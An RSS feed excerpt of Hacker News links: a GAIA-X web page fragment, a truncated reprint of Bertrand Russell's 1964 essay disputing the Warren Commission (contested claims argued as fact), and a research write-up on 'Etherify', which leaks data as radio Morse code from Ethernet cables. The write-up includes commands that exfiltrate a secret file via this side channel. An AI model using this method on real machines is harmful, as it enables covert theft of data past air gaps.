srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-03.jpg?__blob=normal&amp;v=3&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-03.jpg?__blob=normal&amp;v=3&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-03.jpg?__blob=normal&amp;v=3&amp;size=480w" title="Alban Schmutz, Chariman of CISPE (Cloud Infrastructure Services Providers in Europe)" alt="Alban Schmutz, Chariman of CISPE (Cloud Infrastructure Services Providers in Europe)"> </picture> </a> <figcaption> <p> © CISPE </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-04.jpg?__blob=poster&amp;v=3&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-04.jpg?__blob=normal&amp;v=3&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-04.jpg?__blob=normal&amp;v=3&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-04.jpg?__blob=normal&amp;v=3&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-04.jpg?__blob=normal&amp;v=3&amp;size=480w" title="Oliver Vallet, CEO Docaposte" alt="Oliver Vallet, CEO Docaposte"> </picture> </a> <figcaption> <p> © Docaposte </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-05.jpg?__blob=poster&amp;v=3&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-05.jpg?__blob=normal&amp;v=3&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-05.jpg?__blob=normal&amp;v=3&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-05.jpg?__blob=normal&amp;v=3&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-05.jpg?__blob=normal&amp;v=3&amp;size=480w" title="Prof. Dr. Friedhelm Loh, Owner and Chairman of the Friedhelm Loh Group" alt="Prof. Dr. Friedhelm Loh, Owner and Chairman of the Friedhelm Loh Group"> </picture> </a> <figcaption> <p> © Friedhelm Loh Group </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-06.jpg?__blob=poster&amp;v=3&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-06.jpg?__blob=normal&amp;v=3&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-06.jpg?__blob=normal&amp;v=3&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-06.jpg?__blob=normal&amp;v=3&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-06.jpg?__blob=normal&amp;v=3&amp;size=480w" title="Stèphane Richard, CEO of Orange" alt="Stèphane Richard, CEO of Orange"> </picture> </a> <figcaption> <p> © Orange </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-07.jpg?__blob=poster&amp;v=4&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-07.jpg?__blob=normal&amp;v=4&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-07.jpg?__blob=normal&amp;v=4&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-07.jpg?__blob=normal&amp;v=4&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-07.jpg?__blob=normal&amp;v=4&amp;size=480w" title="Oliver Mauss, CEO der PlusServer-Gruppe" alt="Oliver Mauss, CEO der PlusServer-Gruppe"> </picture> </a> <figcaption> <p> © PlusServer-Gruppe </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-08.jpg?__blob=poster&amp;v=4&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-08.jpg?__blob=normal&amp;v=4&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-08.jpg?__blob=normal&amp;v=4&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-08.jpg?__blob=normal&amp;v=4&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-08.jpg?__blob=normal&amp;v=4&amp;size=480w" title="Claudia Nemat, Member of the Borad of Management (Technology and Innovation), Deutsche Telekom AG" alt="Claudia Nemat, Member of the Borad of Management (Technology and Innovation), Deutsche Telekom AG"> </picture> </a> <figcaption> <p> © Telekom AG </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-09.jpg?__blob=poster&amp;v=2&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-09.jpg?__blob=normal&amp;v=2&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-09.jpg?__blob=normal&amp;v=2&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-09.jpg?__blob=normal&amp;v=2&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-09.jpg?__blob=normal&amp;v=2&amp;size=480w" title="Hans Thalbauer, Senior Vice President SAP" alt="Hans Thalbauer, Senior Vice President SAP"> </picture> </a> <figcaption> <p> © SAP </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-10.jpg?__blob=poster&amp;v=2&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-10.jpg?__blob=normal&amp;v=2&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-10.jpg?__blob=normal&amp;v=2&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-10.jpg?__blob=normal&amp;v=2&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-10.jpg?__blob=normal&amp;v=2&amp;size=480w" title="Gerd Hoppe, Member of the Executive Board, Beckhoff Automation GmbH" alt="Gerd Hoppe, Member of the Executive Board, Beckhoff Automation GmbH"> </picture> </a> <figcaption> <p> © Beckhoff Automation GmbH </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-11.jpg?__blob=poster&amp;v=1&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-11.jpg?__blob=normal&amp;v=1&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-11.jpg?__blob=normal&amp;v=1&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-11.jpg?__blob=normal&amp;v=1&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-11.jpg?__blob=normal&amp;v=1&amp;size=480w" title="Michel Paulin, CEO at OVHcloud" alt="Michel Paulin, CEO at OVHcloud"> </picture> </a> <figcaption> <p> © OVHcloud </p> </figcaption> </figure> </div> <div> <figure> <a title="title-text" data-toggle="lightbox" data-fancybox-group="gallery1840934" href="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-12.jpg?__blob=poster&amp;v=1&amp;size=1170w"> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-12.jpg?__blob=normal&amp;v=1&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-12.jpg?__blob=normal&amp;v=1&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-12.jpg?__blob=normal&amp;v=1&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bildergalerie/GAIA-X-Zitate/zitat-12.jpg?__blob=normal&amp;v=1&amp;size=480w" title="Michael Bolle, Managing Director Robert Bosch GmbH" alt="Michael Bolle, Managing Director Robert Bosch GmbH"> </picture> </a> <figcaption> <p> © Robert Bosch GmbH </p> </figcaption> </figure> </div> </div> </div> <div id="id1839166" tabindex="-1"> <div> <div> <p> <span>Technical Concept</span> </p> <h2> How does GAIA-X work? </h2> </div>  </div> <div> <div> <div> <p>Federated services provide value if they are based on common standards which ensure transparency and interoperability. GAIA-X addresses this requirement by aligning network and interconnection providers, Cloud Solution Providers (CSP), High Performance Computing (HPC) as well as sector specific clouds and edge systems. Here, mechanisms are developed to find, combine and connect services from participating providers in order to enable a user-friendly infrastructure ecosystem. GAIA-X identifies the minimum technical requirements and services necessary to operate the federated GAIA-X Ecosystem. The development of these services will follow the principles of Security by Design and also include the concept of Privacy by Design in order to ensure highest security requirements and privacy protection.</p> <p>Technical implementation of these Federation Services will focus on the following areas:</p> <ul><li>the implementation of secure federated identity and trust mechanisms (security and privacy by design);</li><li>sovereign data services which ensure the identity of source and receiver of data and which ensure the access and usage rights towards the data;</li><li>easy access to the available providers, nodes and services. Data will be provided through federated catalogues; </li><li>the integration of existing standards to ensure interoperability and portability across infrastructure, applications and data; </li><li>the establishment of a compliance framework and Certification and Accreditation services; and</li><li>the contribution of a modular compilation of open source software and standards to support providers in delivering a secure, federated and interoperable infrastructure.</li></ul> <p>The initial set of federation services will be expanded. The roadmap is aligned with the development of ecosystem participants’ requirements.</p> </div> </div> </div> </div> <div id="id1839168" tabindex="-1"> <div> <div> <p> <span>GAIA-X in practice</span> </p> <h2> Use Cases: GAIA-X from the user perspective </h2> </div> <p>GAIA-X gives users access to a broad and highly useful range of specialised products and services from cloud providers, thus enabling the use of tailored solutions. In this context, GAIA-X offers full transparency through the self-description, provides certified data protection and supplies regulatory criteria for the products and services offered.</p>  </div> <div> <div> <div> <p>Clear conditions for participation in GAIA-X and for collaboration, and common rules for cross-company authentication and access management will strengthen the underlying level of trust, bring down the obstacles to participation and reduce the amount of work involved in bilateral coordination between individual users.</p> <p>A further important added benefit of GAIA-X is the guarantee of data sovereignty: Each user decides for herself where her data is stored, as well as who may process it and for what purpose, based on the user’s own data classification. In that sense GAIA-X enables modular solutions. Users can also access AI applications and data pools via the trustworthy data infrastructure. Based on standardisation rules and the different options for managing and controlling the transfer of data, data can be exchanged between the companies, linked with other data, processed, evaluated, and monetised in value creation networks. The opportunities of data and service sharing can promote innovations, exploit synergies and enable new business models to be developed and scaled up. </p> <p>The aim of Workstream 1 ‘User ecosystems and requirements’ is to achieve the stated added benefits through a broad and sustained mobilisation of the user and demand perspective. This occurs through continual identification, integration, development and implementation of domain-specific use cases, which illustrate the need for and the added benefit of a sovereign European data infrastructure. The work also focuses on defining domain-specific and cross-domain requirements. These form the foundation for the growth of data infrastructures.</p> <p>In the meantime, more than 40 use cases have been submitted in eight domains (‘Industry 4.0/SME’, ‘Health’, ‘Finance’, ‘Public Sector’, ‘Smart Living’, ‘Energy’, ‘Mobility’ and ‘Agriculture’). They come from various companies and organisations from European countries, including Germany, France, the Netherlands, Spain and Switzerland. On the one hand, they illustrate need for and the added benefit of GAIA-X. On the other hand, they each represent a domain and serve as basis to identify and validate domain-specific and cross-domain requirements and to allow these to be incorporated into the development of GAIA-X.</p> <p>All project participants are invited to participate in Workstream 1 ‘User Ecosystems and Requirements’: Both by submitting new use cases and by active and …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html">https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html</a></em></p>]]>
            </description>
            <link>https://www.data-infrastructure.eu/GAIAX/Navigation/EN/Home/home.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012624</guid>
            <pubDate>Sat, 07 Nov 2020 01:33:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bertrand Russell's 16 Questions on the Assassination of JFK (1964)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25012517">thread link</a>) | @AndrewBissell
<br/>
November 6, 2020 | http://22november1963.org.uk/bertrand-russell-16-questions-on-the-assassination | <a href="https://web.archive.org/web/*/http://22november1963.org.uk/bertrand-russell-16-questions-on-the-assassination">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> <!-- left side in two-column layout -->

            <article>


            

            <h2>By Bertrand Russell</h2>
            <p>[Originally published in: <strong><cite>The Minority of One</cite>, 6 September 1964, pp.6–8.</strong>]</p>
            <p>The official version of the <a href="http://22november1963.org.uk/" title="John F. Kennedy assassination">assassination of President Kennedy</a> has been so riddled with contradictions that it is been abandoned and rewritten no less than three times. Blatant fabrications have received very widespread <a href="http://22november1963.org.uk/the-media-and-the-jfk-assassination" title="Media coverage of the JFK assassination">coverage by the mass media</a>, but denials of these same lies have gone unpublished. Photographs, evidence and affidavits have been doctored out of recognition. Some of the most important aspects of <a href="http://22november1963.org.uk/how-did-oswald-kill-kennedy" title="The case against Lee Harvey Oswald">the case against Lee Harvey Oswald</a> have been completely blacked out. Meanwhile, the F.B.I., the police and the Secret Service have tried to silence key witnesses or instruct them what evidence to give. Others involved have disappeared or died in extraordinary circumstances.</p>
            <p>It is facts such as these that demand attention, and which the <a href="http://22november1963.org.uk/warren-commission-jfk-assassination" title="The Warren Commission's investigation of the JFK assassination">Warren Commission</a> should have regarded as vital. Although I am writing before the publication of the Warren Commission’s report, leaks to the press have made much of its contents predictable. Because of the high office of its members and the fact of its establishment by President Johnson, the Commission has been widely regarded as a body of holy men appointed to pronounce the truth. An impartial examination of the composition and conduct of the Commission suggests quite otherwise.</p>
            <h2>1: Membership of the Warren Commission</h2>
            <p>The Warren Commission has been utterly unrepresentative of the American people. It consisted of:</p>
            <ul>
                <li>two Democrats, <a href="http://22november1963.org.uk/richard-russell-warren-report" title="Senator Richard Russell's objection to the Warren Report">Senator Russell of Georgia</a> and Congressman Boggs of Louisiana, both of whose racist views have brought shame on the United States;</li>
                <li>two Republicans, Senator Cooper of Kentucky and Congressman Gerald R. Ford of Michigan, the latter of whom is a leader of his local Goldwater movement and an associate of the F.B.I.;</li>
                <li>Allen Dulles, former director of the Central Intelligence Agency,</li>
                <li>and Mr. McCloy, who has been referred to as the spokesman for the business community.</li>
            </ul>
            <p>Leadership of the filibuster in the Senate against the Civil Rights Bill prevented Senator Russell from attending hearings during the period. The Chief Justice of the United States Supreme Court, Earl Warren, who rightly commands respect, was finally persuaded, much against his will, to preside over the Commission, and it was his involvement above all else that helped lend the Commission an aura of legality and authority. Yet many of its members were also members of those very groups which have done so much to distort and suppress the facts about the assassination. Because of their connection with the Government, not one member would have been permitted under U.S. law to serve on a jury <a href="http://22november1963.org.uk/lee-harvey-oswald-fair-trial" title="Did Lee Harvey Oswald get a fair trial?">had Oswald faced trial</a>. It is small wonder that the Chief Justice himself remarked that the release of some of the Commission’s information “might not be in your lifetime.” Here, then, is my first question: <strong>Why were all the members of the Warren Commission closely connected with the U.S. Government?</strong></p>
            <h2>2 and 3: Conduct and Official Secrecy</h2>
            <p>If the composition of the Commission was suspect, its conduct confirmed one’s worst fears. No counsel was permitted to act for Oswald, so that cross–examination was barred. Later, under pressure, the Commission appointed the President of the American Bar Association, Walter Craig, one of the supporters of the Goldwater movement in Arizona, to represent Oswald. To my knowledge, he did not attend hearings, but satisfied himself with representation by observers.</p>
            <p>In the name of national security, the Commission’s hearings were held in secret, thereby continuing the policy which has marked the entire course of the case. This prompts my second question: <strong>If, as we are told, Oswald was the lone assassin, where is the issue of national security?</strong> Indeed, precisely the same question must be put here as was posed in France during the Dreyfus case: <strong>If the Government is so certain of its case, why has it conducted all its inquiries in the strictest secrecy?</strong></p>
            <h2>4: The Crucial Question Was Not Asked</h2>
            <p>At the outset the Commission appointed six panels through which it would conduct its enquiry. They considered:</p>
            <ol>
                <li>What did Oswald do on November 22, 1963?</li>
                <li>What was Oswald’s background?</li>
                <li>What did Oswald do in the U.S. Marine Corps, and in the Soviet Union?</li>
                <li>How did Ruby kill Oswald?</li>
                <li>What is Ruby’s background?</li>
                <li>What efforts were taken to protect the President on November 22?</li>
            </ol>
            <p>This raises my fourth question: <strong>Why did the Warren Commission not establish a panel to deal with the question of who killed President Kennedy?</strong></p>
            <h2>5: Challenging the Commission</h2>
            <p>All the evidence given to the Commission has been classified “Top Secret,” including even a request that hearings be held in public. Despite this the Commission itself leaked much of the evidence to the press, though only if the evidence  tended to prove Oswald the lone assassin. Thus, Chief Justice Warren held a press conference after Oswald’s wife, Marina, had testified. He said that she believed her husband was the assassin. Before Oswald’s brother Robert testified, he gained the Commission’s agreement not to comment on what he said. After he had testified for two days, the newspapers were full of stories that “a member of the Commission” had told the press that Robert Oswald had just testified that he believed that his brother was an agent of the Soviet Union. Robert Oswald was outraged by this, and he said that he could not remain silent while lies were told about his testimony. He had never said this and he had never believed it. All that he had told the Commission was that he believed his brother was innocent and was in no way involved in the assassination.</p>
            <p>The methods adopted by the Commission have indeed been deplorable, but it is important to challenge the entire role of the Warren Commission. It stated that it would not conduct its own investigation, but rely instead on the existing governmental agencies — the F.B.I., the Secret Service and the Dallas police. Confidence in the Warren Commission thus presupposes confidence in these three institutions. <strong>Why have so many liberals abandoned their own responsibility to a Commission whose circumstances they refuse to examine?</strong></p>
            <h2>6: Oswald the Subversive</h2>
            <p>It is known that the strictest and most elaborate security precautions ever taken for a President of the United States were ordered for November 22 in Dallas. The city had a reputation for violence and was the home of some of the most extreme right–wing fanatics in America. Mr. and Mrs. Lyndon Johnson had been assailed there in 1960 when he was a candidate for the Vice–Presidency. Adlai Stevenson had been physically attacked when he spoke in the city only a month before Kennedy’s visit. On the morning of November 22, the <cite>Dallas Morning News</cite> carried a full–page advertisement <a href="http://22november1963.org.uk/jfk-assassination-political-context" title="Political context of the JFK assassination">associating the President with Communism</a>. The city was covered with posters showing the President’s picture and headed “Wanted for Treason.” The Dallas list of subversives comprised 23 names, of which Oswald’s was the first. All of them were followed that day, except Oswald. <strong>Why did the authorities follow many persons as potential assassins and fail to observe Oswald’s entry into the book depository building while allegedly carrying a rifle over three feet long?</strong></p>
            <h2>7: The Route of the Motorcade</h2>
            <p>The President’s route for his drive through Dallas was widely known and was printed in the <cite>Dallas Morning News</cite> on November 22. At the last minute the Secret Service changed a small part of their plans so that the President left Main Street and turned into Houston and Elm Streets. This alteration took the President past the book depository building from which it is alleged that Oswald shot him. How Oswald is supposed to have known of this change has never been explained. <strong>Why was the President’s route changed at the last minute to take him past Oswald’s place of work?</strong></p>
            <h2>8: Changing the Evidence</h2>
            <p>After the assassination and Oswald’s arrest, judgment was pronounced swiftly: Oswald was the assassin, and he had acted alone. No attempt was made to arrest others, no road blocks were set up round the area, and every piece of evidence which tended to incriminate Oswald was announced to the press by the Dallas District Attorney, Mr. Wade. In such a way millions of people were prejudiced against Oswald before there was any opportunity for him to be brought to trial. The first theory announced by the authorities was that the President’s car was in Houston Street, approaching the book depository building, when Oswald opened fire. When available photographs and eyewitnesses had shown this to be quite untrue, the theory was abandoned and a new one formulated which placed the vehicle in its correct position. Meanwhile, however, D.A. Wade had announced that three days after Oswald’s room in Dallas had been searched, a map had been found there on which the book depository building had been circled and dotted lines drawn from the building to a vehicle on Houston Street, showing the <a href="http://22november1963.org.uk/single-bullet-theory-jfk-assassination" title="JFK assassination bullet trajectory">alleged bullet trajectory</a> had been planned in advance. After the first theory was proved false, the Associated Press put out the following story on November 27: “Dallas authorities announced today that there never was a map.”</p>
            <p>The second theory correctly placed the President’s car on Elm Street, 50 to 75 yards past the book depository, but had to contend with the difficulty that the President was shot from the front, in the throat. <strong>How did Oswald manage to shoot the President in the front from behind?</strong> The F.B.I. held a series of background briefing sessions for <cite>Life</cite> magazine, which in its issue of December 6 explained that the President had turned completely round just at the time he was shot. This too, was soon shown to be entirely false. It …</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://22november1963.org.uk/bertrand-russell-16-questions-on-the-assassination">http://22november1963.org.uk/bertrand-russell-16-questions-on-the-assassination</a></em></p>]]>
            </description>
            <link>http://22november1963.org.uk/bertrand-russell-16-questions-on-the-assassination</link>
            <guid isPermaLink="false">hacker-news-small-sites-25012517</guid>
            <pubDate>Sat, 07 Nov 2020 01:02:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Etherify – bringing the ether back to ethernet]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25012469">thread link</a>) | @vitplister
<br/>
November 6, 2020 | https://lipkowski.com/etherify/ | <a href="https://web.archive.org/web/*/https://lipkowski.com/etherify/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="content">

<div>
	<div id="primary">
		<main id="main" role="main">

			
<article id="post-69" class="page">
	<!-- .entry-header -->
	<div>
		<p>Leaking data via out of unconnected devices (both connected and unconnected) is a very interesting topic, often called “soft tempest”. Often this is the realm of absurdly costly lab equipment, source code isn’t published etc.&nbsp; Here i would like to demonstrate this using the simplest equipment and means, and make it very easy to reproduce.</p>
<p>To transmit an elecromagnetic wave one needs to have a conductor driven by a high frequency source. Various busses are used: monitor cables, pci buses etc. Here i propose the use of ethernet.</p>
<p>An ethernet cable consists of 4 twisted pair lines with 100ohm impedance., which carries RF signals in the tens to hundredths MHz range. Any imperfections in the cable (asymetry etc) or in the interface will cause radio signals to be radiated.</p>
<p>Signals can be modulated using different methods. Here i will use morse code for simplicity. This also allows one to judge the signal to noise ratio by just listening. It is also possible to decode it by ear without additional devices if one knows morse code, if not there is a lot of software that can do it (although usually with much worse performance than an experienced human operator).</p>
<p>Transmission is implemented via very simple shell scripts. Only bash, ethtool and ping is needed. This enables the script to be used easily on embedded devices and other platforms where shipping binaries, installing a python environment etc might be a problem.</p>
<p>The proof-of-concept scripts are avaliable at <a href="https://github.com/sq5bpf/etherify">https://github.com/sq5bpf/etherify</a></p>
<p><strong>Etherify 1 – transmitting by switching speed</strong></p>
<p>Various ethernet speeds have different modulation speeds, types and encoding. By switching between we can modulate the RF signal leaking from the wires.</p>
<p>10base-T uses manchester encoding with 10MHz symbol rate. This is used as the space signal (logical 0).</p>
<p>100base-T uses 4B5B encoding with NRZI at 125MHz symbol rate . This results in an easy to receive signal around 125MHz, this is used as the mark signal (logical 1).</p>
<p>Ethernet transmits an idle sequence when no packets are carried, so the signal is constant. No packets have to be transmitted for the signal to be present, on the speed of the interface has to be changed.</p>
<p>The transmission is implemented by a simple bash script, which sends the content of a short text file given as the argument, or “etherify demo” if none is given. The signal can be received as morse code around 125MHz, please use USB or CW mode in the receiver and use a narrow filter.</p>
<p>Demo:</p>
<p>Ensure that the two raspberry PIs are connected and that there is an ethernet link between them (signalled via the LEDs).</p>
<p>Run as root:</p>
<p>./etherify1</p>
<p>to transmit “etherify demo” or to exfiltrate the contents of /tmp/secret.txt</p>
<p>./etherify1 /tmp/secret.txt</p>
<p>Listen to the signal at 125MHz as described below.</p>
<p><iframe title="Etherify 1 demo receiving via SDR and decoding via fldigi" width="525" height="295" src="https://www.youtube.com/embed/ueC4SLPrtNg?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>The is decodable by ear with a simple Moxon directional antenna and a ham radio receiver (SDR could be used too).</p>
<p>This results in a strong signal at 15m distance:</p>
<p><iframe title="Etherify 1 at 15m" width="525" height="295" src="https://www.youtube.com/embed/MK15ofaWS_U?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>The results at 100m distance (weak signal, please use headphones):</p>
<p><iframe title="Etherify 1 at 100m" width="525" height="295" src="https://www.youtube.com/embed/1hdmZOwssGM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>If in doubt let an experienced amateur radio operator decode it. I was not able to decode the signal at 100m with software.</p>
<p><strong>Etherify 2 – transmitting by sending data</strong></p>
<p>Sending a stream of data at 1Gbps also produces a detectable signal change at 125MHz. There may be other frequencies where the signals were more readable, but equipment was avaliable to receive at 125MHz. This probably works by loading the supply voltage when the packets are generated. A change of voltage probably changes the frequency of some clock slightly, thus generating FSK (F1A to be exact). Note that this doesn’t work with all hardware, which could be explained by the hypothesis about the frequency being modulated by the interface load.</p>
<p>A large volume of traffic represents a logical 1, while no traffic represents logical 0.</p>
<p>The transmission is implemented as a simple bash script, which sends the content of a short text file given as the argument, or “etherify demo” if none is given. The signal can be received as morse code around 125MHz, please use USB or CW mode in the receiver and use a narrow filter, also AM mode can be used.</p>
<p>Demo:</p>
<p>Ensure that the two raspberry PIs are connected and that there is an ethernet link between them (signalled via the LEDs). Set one raspberry PI to 192.168.1.1/24 and the other to 192.168.1.2/24 (the IP address can be changed in the etherify2 script). Ensure that the two raspberry PIs have IP connectivity and can ping each other, and that he interface rate is 1Gbps.</p>
<p>On the 192.168.1.2 raspberry PI run as root:</p>
<p>./etherify2</p>
<p>to transmit “etherify demo” or to exfiltrate the contents of /tmp/secret.txt</p>
<p>./etherify2 /tmp/secret.txt</p>
<p>Listen to the signal at 125MHz as described below.</p>
<p>The signal was decodable by ear at a distance of 30m with a simple Moxon directional antenna and a ham radio receiver.</p>
<p>This results in a strong signal at 15m distance:</p>
<p><iframe title="Etherify 2 at 15m" width="525" height="295" src="https://www.youtube.com/embed/9zKCrdAY1oQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>And a readable signal at 30m:</p>
<p><iframe title="Etherify 2 at 30m" width="525" height="295" src="https://www.youtube.com/embed/CCttAsAU_IU?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
